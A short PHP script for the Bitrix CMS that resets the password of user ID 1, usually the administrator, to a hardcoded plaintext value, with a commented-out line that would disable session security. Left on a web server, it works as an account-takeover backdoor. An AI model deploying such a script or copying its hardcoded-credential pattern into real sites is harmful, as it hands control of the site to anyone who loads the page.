<?php
require($_SERVER['DOCUMENT_ROOT']."/bitrix/header.php");
echo $USER->Update(1,array("PASSWORD"=>'Ytrhjyjvbrjy1984'));
echo $USER->LAST_ERROR;

//COption::SetOptionInt('security','session','N');

require($_SERVER['DOCUMENT_ROOT']."/bitrix/footer.php");
?>

